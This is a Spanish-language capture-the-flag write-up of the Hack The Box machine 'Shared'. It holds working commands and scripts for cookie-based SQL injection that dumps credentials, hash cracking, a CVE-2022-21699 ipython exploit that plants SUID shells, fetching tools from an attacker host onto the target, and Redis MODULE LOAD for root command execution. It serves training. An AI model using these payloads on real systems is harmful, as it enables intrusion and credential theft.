---
title: Shared HTB Writeup
published: 2024-02-14
description: 'Contiene una Web Vulnerable a SQLI, la cual usamos para ver credenciales de James. Luego abusamos de Redis para conseguir ROOT.'
image: 'image.png'
tags: [Medium, Linux]
category: 'HackTheBox'
draft: false 
---

Shared es una máquina Linux mediana creada por Nauten en Hack The Box que presenta un sitio web con un nombre de host virtual que es vulnerable a la inyección SQL. La explotación exitosa de esta vulnerabilidad nos proporciona la contraseña de un usuario llamado james_mason. Con estas credenciales somos capaces de iniciar sesión a través de SSH y elevar privilegios a un usuario llamado dan_smith explotando un cron job que utiliza una versión de ipython que es vulnerable a CVE-2022-21699. A continuación, aplicamos ingeniería inversa a un ejecutable utilizando análisis estáticos y dinámicos para recuperar la contraseña del servicio local Redis. El proceso Redis se ejecuta como root, por lo que cargamos un módulo especial de objetos compartidos utilizando LOAD MODULE para ejecutar comandos como root.

# Initial Recon
Primero configuremos nuestro entorno y ejecutemos un escaneo de puertos TCP con esta envoltura nmap personalizada.

```bash
# Mil4ne@Kali
export rhost="10.10.10.x"
sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv  $rhost -oG nmap
```

El análisis informa de que los servicios SSH, HTTP y HTTPS se ejecutan en los puertos 22, 80 y 443 respectivamente.
Web Recon

Al visitar el puerto 80, se nos redirige a shared.htb. Añadamos este nombre de host a nuestro archivo ``/etc/hosts{:.filepath}`` con la dirección IP correspondiente.

Ahora visitaremos https://shared.htb/ en una sesión de navegador proxy a través del proxy HTTP BurpSuite.

Página de índice Página de índice de la web ``shared.htb``

## Walking the Application

Al explorar el contenido del sitio web, descubrimos la página de pago en /index.php?controller=cart&action=show. Cuando pasamos el ratón por encima del botón de pago, podemos ver que nos enviará a https://checkout.shared.htb. Añadamos este nombre de host virtual a nuestro archivo /etc/hosts{:.filepath} para poder ver su contenido.

```bash
sudo sed -E -i 's/(shared.htb).*/\1 checkout.\1/' /etc/hosts
```

Ahora, cuando añadamos un artículo a nuestro carrito y naveguemos a /index.php?controller=cart&action=show, haremos clic en el botón de pago para ser redirigidos al sitio de pago.

## Investigación de la funcionalidad

Es interesante cómo este sitio es capaz de determinar qué artículo teníamos en nuestro carrito teniendo en cuenta que no proporcionamos ningún parámetro HTTP GET o POST. Vamos a investigar.

Observando la solicitud inicial que enviamos al sitio de pago en el mapa del sitio de BurpSuite, podemos ver que nuestra solicitud contiene una cookie inusual llamada custom_cart. El valor de esta cookie se puede descifrar automáticamente resaltándolo, revelando un objeto JSON con el código de producto y la cantidad del artículo de pago.

Encontramos una misteriosa cookie en BurpSuite

Podemos deducir que el sitio utiliza el código de producto suministrado en custom_cart para encontrar el precio del artículo, ya que no suministramos el precio, sino sólo el código de producto. Es probable que esta actividad sea gestionada por algún tipo de solución de base de datos, como un servidor SQL. Teniendo esto en cuenta, podemos comprobar si esta funcionalidad es vulnerable a la inyección SQL.
## Descubrimiento de vulnerabilidades

Introduzcamos algunas cargas útiles básicas de inyección SQL en la cookie de la pestaña de repetición de BurpSuite para ver si es posible la inyección SQL.

Respuesta del servidor a una carga útil de inyección SQL común

```bash
{"CRAAFTKP'#":"1"}
```

La respuesta a la primera carga útil sugiere que la inyección SQL es posible, pero podemos asegurarnos enviando una carga útil que debería evaluarse como falsa, y otra que debería ser verdadera.

```bash
#!/usr/bin/env python3

from urllib.parse import quote
from sys import argv

if len(argv) == 2:
        sqli = argv[1]
        sqli = sqli.replace('\\', '\\\\')
        sqli = sqli.replace('"','\\"')
        print(quote('{"' + argv[1] + '":"1"}'))
```

```bash
chmod +x makepayload.py
true=$(./makepayload.py "' OR 1=1#") # Always resolves to true
false=$(./makepayload.py "' AND 1=2#") # Always resolves to false

url="https://checkout.shared.htb"
curl -k -s $url -b "custom_cart=$true" | sed 's/^ *//' > true.html
curl -k -s $url -b "custom_cart=$false" | sed 's/^ *//' > false.html
```

Esto debería dejarte con dos archivos llamados false.html{:.filepath} y true.html{:.filepath}. Para encontrar la diferencia entre los dos cuerpos de respuesta podemos usar diff.

```bash
diff false.html true.html
```

```bash
37,39c37,39
< <td>Not Found</td>
< <td>0</td>
< <td>$0,00</td>
---
> <td>53GG2EF8</td>
> <td>1</td>
> <td>$23,90</td>
45c45
< <th scope="col">$0,00</th>
---
> <th scope="col">$23,90</th>
```

La consulta falsa devuelve «No encontrado» y valores cero para la cantidad y el precio, mientras que la consulta verdadera devuelve una entrada de producto. Esto es definitivamente suficiente evidencia de una vulnerabilidad de inyección SQL para comenzar la explotación.

# Web Exploitation

Ya hemos determinado que la inyección SQL ciega basada en booleanos es posible con las consultas true y false, pero hay muchas posibilidades de que podamos utilizar las consultas UNION SELECT para filtrar valores de la base de datos sin tener que utilizar un canal secundario.

## Union Query Exfiltration

Primero vamos a averiguar el número de columnas de la consulta original para poder compararlo con nuestra extensión UNION SELECT.

```bash
payload=$(./makepayload.py "' UNION SELECT 'c0lumn1','c0lumn2','c0lumn3'#")

curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" | \
	sed 's/^ *//' |
	egrep '</?td>'
```

```bash
<td>c0lumn2</td>
<td>1</td>
<td>$</td>
```

Observa cómo la respuesta contiene el valor que enviamos en la segunda columna. Esto significa que podemos extraer datos a través de la segunda columna. Ahora vamos a crear un script para obtener cualquier valor en bruto de la base de datos.

```bash
#!/bin/bash

[ -z "$SELECT" ] && echo "SELECT=* FROM=* WHERE=* $0" && exit

payload="' UNION SELECT '',$SELECT,''"

[ -z "$FROM" ] || payload="$payload FROM $FROM"
[ -z "$WHERE" ] || payload="$payload WHERE $WHERE" 

echo $payload

payload=$(./makepayload.py "$payload#")

curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" |
	egrep '</?td>' |
	head -1 |
	sed -E 's/^ *<td>(.*)<\/td>$/\1/'
```

Entonces podemos ver si podemos obtener los nombres de las bases de datos disponibles. Recuerde que esta base de datos es probablemente MySQL porque el # comentario está funcionando.

```bash
chmod +x sqli.sh
SELECT="group_concat(schema_name)"   \
FROM="information_schema.schemata"   \
	./sqli.sh
```

```bash
information_schema,checkout
```

Hay una base de datos llamada checkout que deberíamos explorar. Busquemos los nombres de sus tablas.

```bash
SELECT="group_concat(table_name)"   \
FROM="information_schema.tables"    \
WHERE="table_schema='checkout'"     \
	./sqli.sh
```

```bash
user,product
```
La tabla de usuarios parece interesante. Busquemos los nombres de las columnas y volquemos el contenido de la tabla.

```bash
SELECT="group_concat(column_name)"   \
FROM="information_schema.columns"    \
WHERE="table_name='user'"            \
	./sqli.sh
```

```bash
id,username,password
```

```bash
SELECT="group_concat(concat(id,0x7c,username,0x7c,password))" \
FROM="checkout.user" \
	./sqli.sh
```

```bash
1|james_mason|[REDACTED]
```

Sólo hay un resultado, pero tenemos lo que parece un hash MD5 en la columna de contraseña para el usuario james_mason.
Shell as james_mason

intentemos descifrar el hash usando a John the Ripper

```bash
# mhil4ne@kali
hash="" # Hash here
echo "james_mason:$hash" > md5.john
john md5.john \
	--format="raw-md5" \
	--wordlist="rockyou.txt" # classic rockyou.txt wordlist
```

Usando estas credenciales en el servidor SSH del objetivo obtendremos un shell como james_mason.

```bash
# mhil4ne@kali
ssh "james_mason@$rhost"
```

No hay ninguna bandera de usuario en nuestro directorio de inicio, por lo que puede que tengamos que hacer algún movimiento lateral.

# Lateral Movement

Usaremos LinPEAS de PEASS-ng para buscar cualquier información útil en la máquina. También usaremos pspy para husmear en los procesos.

```bash
# mhil4ne@kali
lhost="10.10.14.10" # Listener host
cd $(mktemp -d)
wget \
	"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" \
	"https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh"
php -S $lhost:80
```

```bash
# james_mason@shared.htb (SSH)
lhost="10.10.14.10" # Attacker's IP address
mkdir .sneak && cd .sneak
wget "http://$lhost/pspy64" "http://$lhost/linpeas.sh"
bash ./linpeas.sh | tee linpeas.log
```

No obtenemos nada que destaque en la salida de LinPEAS. Intentemos ejecutar PSpy durante unos minutos.

```bash
# james_mason@shared.htb (SSH)
chmod +x pspy64
timeout 3m ./pspy64 | tee pspy.log
```

Mirando la salida, el UID 0 y el UID 1001 parecen estar ejecutando comandos rutinarios. El UID 0 es root y el ID de usuario 1001 resulta ser el usuario dan_smith, declarado en ``/etc/passwd{:.filepath}``. Se puede observar que dan_smith ejecuta un comando interesante cada minuto.

```bash
/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```

El usuario entra en el directorio ``/opt/scripts_review{:.filepath}`` y ejecuta ``/usr/local/bin/ipython{:.filepath}``.

## CVE-2022-21699

Tras investigar un poco sobre ipython, nos encontramos con un aviso de vulnerabilidad que detalla un fallo de ejecución de código.

    > Nos gustaría revelar una vulnerabilidad de ejecución de código arbitrario en IPython que proviene de IPython ejecutando archivos no confiables en CWD. Esta vulnerabilidad permite a un usuario ejecutar código como otro.

Comprobemos si la versión de la máquina es vulnerable.

```bash
# james_mason@shared.htb (SSH)
/usr/local/bin/ipython --version
```

La versión es 8.0.0, que es vulnerable. Dado que el comando de rutina ejecutado por dan_smith se ejecuta en el directorio /opt/scripts_review{:.filepath}, podríamos explotar la vulnerabilidad si ``/opt/scripts_review{:.filepath}`` es escribible.

```bash
# james_mason@shared.htb (SSH)
ls -la /opt/scripts_review
```

Es escribible por aquellos en el grupo de desarrolladores. Según la salida del comando id, nuestro usuario actual forma parte de este grupo.

## Exploitation

Pongamos a prueba nuestra hipótesis siguiendo las instrucciones del aviso para ejecutar código como dan_smith.

```bash
#!/bin/bash

exploitdir="/opt/scripts_review"
cmd="cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh"

mkdir -m 777 "$exploitdir/profile_default"
mkdir -m 777 "$exploitdir/profile_default/startup"
echo "__import__('os').popen('$cmd')" > "$exploitdir/profile_default/startup/x.py"
```

Después de ejecutar el script y esperar un minuto, nuestro shell SUID debería estar en ``/tmp/dan_smith_sh{:.filepath}.``

```bash
# james_mason@shared.htb (SSH)
/tmp/dan_smith_sh -p
```
# Privilege Escalation

La primera bandera se encuentra en ``/home/dan_smith/user.txt{:.filepath}``
Stabilizing Shell

Copiemos el contenido de ``/home/dan_smith/.ssh/id_rsa{:.filepath}`` a la máquina atacante y utilicémoslo para iniciar sesión como dan_smith a través de SSH para obtener una shell más estable.

```bash
# mhil4ne@kali
chmod 600 dan_smith_id_rsa
ssh -i dan_smith_id_rsa "dan_smith@$rhost"
```

Al ejecutar el comando id, nos enteramos de que nuestro usuario actual forma parte del grupo sysadmin. Veamos a qué tiene acceso especial este grupo.

```bash
# dan_smith@shared.htb (SSH)
find / -group sysadmin 2>/dev/null
```

```bash
/usr/local/bin/redis_connector_dev
```

Se devuelve un archivo en ``/usr/local/bin/redis_connector_dev{:.filepath}``. Este archivo probablemente tiene algo que ver con una solución de almacenamiento de datos clave-valor conocida como Redis. Cuando ejecutamos ``/usr/local/bin/redis_connector_dev{:.filepath}``, imprime un mensaje de registro que dice «Logging to redis instance using password» y lo que parece la salida de la consulta INFO Server redis.

## Redis

Recopilemos información básica sobre el archivo y veamos qué ocurre entre bastidores.

```bash
# dan_smith@shared.htb (SSH)
file /usr/local/bin/redis_connector_dev|tr ',' '\n'
```

Basándonos en la salida del comando file, podemos observar algunas cosas sobre el archivo:

- Es un ejecutable ELF x86-64
- se ha compilado con un compilador Go (de ahí el Go BuildID)
- No está despojado

Dado que el protocolo Redis RESP funciona en texto plano, podríamos capturar la contraseña. En primer lugar, copiemos el archivo en la máquina del atacante.

```bash
# mhil4ne@kali
scp -i dan_smith_id_rsa "dan_smith@$rhost:/usr/local/bin/redis_connector_dev" .
chmod +x redis_connector_dev
```

Ejecutando el archivo en la máquina atacante, obtenemos un error quejándonos de que el puerto TCP 6379 está cerrado en la dirección loopback. Podemos abrir ese puerto ejecutando nc en una pestaña separada.

```bash
# mhil4ne@kali
nc -lv 127.0.0.1 6379
```

Ahora si ejecutamos ``./redis_connector_dev{:.filepath}`` obtenemos alguna salida al listener.

```bash
Connection received on localhost 35468
*2
$4
auth
$16
[REDACTED]
```

Se pasan las cadenas auth y [REDACTED]. Dadas las circunstancias, la segunda cadena parece que puede ser la contraseña, así que vamos a intentar usarla con el comando redis-cli en la máquina de destino.

```bash
# dan_smith@shared.htb (SSH)
redis-cli -a "$password" INFO server
```

El comando de servidor INFO se ejecuta correctamente. Mientras ejecutamos algunos comandos de enumeración adicionales descubrimos que el almacén de redis está prácticamente vacío.

```bash
# dan_smith@shared.htb (SSH)
redis-cli -a "$password" INFO keyspace
```

Después de algunas investigaciones sobre redis, nos encontramos con esta página que presenta diferentes métodos para lograr RCE en un servidor ``redis``. Esto es útil para nosotros porque el usuario que ejecuta el servidor redis es root, lo que significa que ejecutaremos comandos como root si RCE es posible.

Un método es cargar un archivo especial de objetos compartidos usando la consulta MODULE LOAD. Podemos construir el objeto compartido desde este código fuente en la máquina atacante, luego copiar ``module.so{:.filepath}`` al objetivo.

```bash
# james_mason@shared.htb (SSH)
command="cp /bin/sh /root_sh;chmod a+xs /root_sh"
redis-cli -a "$password" MODULE LOAD ~/module.so &&
	redis-cli -a "$password" system.exec "$command"
/root_sh -p
```
Ejecutar esto nos debe aterrizar un shell como root donde la última bandera se puede encontrar en ``/root/root.txt{:.filepath}``